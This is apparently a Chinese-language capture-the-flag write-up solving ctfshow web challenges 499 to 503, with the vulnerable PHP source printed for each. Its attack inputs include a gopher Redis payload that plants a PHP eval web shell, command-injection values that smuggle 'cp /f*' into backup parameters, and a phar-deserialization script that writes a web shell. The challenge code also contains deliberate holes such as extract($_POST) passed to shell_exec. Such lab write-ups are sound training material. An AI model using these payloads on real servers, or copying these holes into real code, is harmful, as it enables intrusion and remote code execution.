<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gopher:<span class="comment">//127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27zf%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413210540856.png" alt="image-20220413210540856"></p>
<h1 id="web499"><a href="#web499" class="headerlink" title="web499"></a>web499</h1><p>这次多了一个settings.php</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413210943926.png" alt="image-20220413210943926"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 15:50:14</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-16 16:03:19</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings.php&#x27;</span>));</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="variable">$config</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings.php&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413212004560.png" alt="image-20220413212004560"></p>
<p>简单写个一句话,写到了’_<em>DIR</em>_.’&#x2F;..&#x2F;config&#x2F;settings.php</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413212112902.png" alt="image-20220413212112902"></p>
<h1 id="web500"><a href="#web500" class="headerlink" title="web500"></a>web500</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413212450700.png" alt="image-20220413212450700"></p>
<p>这次多了一个数据库备份</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413212901748.png" alt="image-20220413212901748"></p>
<p>找到一个备份地址</p>
<p>api&#x2F;admin_db_backup.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 17:22:29</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-16 19:17:07</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="variable">$db_path</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="variable">$db_path</span>))&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>命令执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">;cp /f* /<span class="keyword">var</span>/www/html/zf.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413215811269.png" alt="image-20220413215811269"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413215857742.png" alt="image-20220413215857742"></p>
<h1 id="web501"><a href="#web501" class="headerlink" title="web501"></a>web501</h1><p>api&#x2F;admin_db_backup.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 17:22:29</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-17 14:39:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^zip|tar|sql$/&#x27;</span>, <span class="variable">$db_format</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$db_format</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">db_format=tar; cp /f* /<span class="keyword">var</span>/www/html/zf.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413220821778.png" alt="image-20220413220821778"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413220833082.png" alt="image-20220413220833082"></p>
<h1 id="web502"><a href="#web502" class="headerlink" title="web502"></a>web502</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 17:22:29</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-18 22:15:42</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pre</span>=<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&#x27;/db.&#x27;</span>;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">			<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(zip|tar|sql)$/&#x27;</span>, <span class="variable">$db_format</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="variable">$pre</span>.<span class="variable">$db_format</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这不是顾头不顾腚吗</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">l; cp /f* /<span class="keyword">var</span>/www/html/zf.txt;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413221724286.png" alt="image-20220413221724286"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413221731992.png" alt="image-20220413221731992"></p>
<h1 id="web503"><a href="#web503" class="headerlink" title="web503"></a>web503</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 17:22:29</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-18 22:15:42</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pre</span>=<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../backup/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&#x27;/db.&#x27;</span>;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">			<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(zip|tar|sql)$/&#x27;</span>, <span class="variable">$db_format</span>))&#123;</span><br><span class="line">		<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; &#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$pre</span>.<span class="variable">$db_format</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份成功&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;数据库备份失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413222608356.png" alt="image-20220413222608356"></p>
<p>又找到一个好东西</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-18 21:53:13</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-18 22:11:18</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="variable">$arr</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span>((<span class="variable">$arr</span>[<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$arr</span>[<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/png&quot;</span> ) &amp;&amp; <span class="variable">$arr</span>[<span class="string">&quot;size&quot;</span>]&lt;<span class="number">10241000</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">		<span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		<span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">			<span class="variable">$basename</span> = <span class="string">&quot;../img/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">			<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$arr</span>[<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$basename</span>);</span><br><span class="line">			<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;logo&#x27;</span>]=<span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这不是来了吗,有一个file_exists($pre.$db_format),还有文件上传.并且这里面的参数还可控</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> =<span class="string">&#x27;&lt;?php @eval($_POST[zf]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> =<span class="string">&quot;./zf.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;zf.phar&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;zf.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$final</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;zf.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413223842488.png" alt="image-20220413223842488"></p>
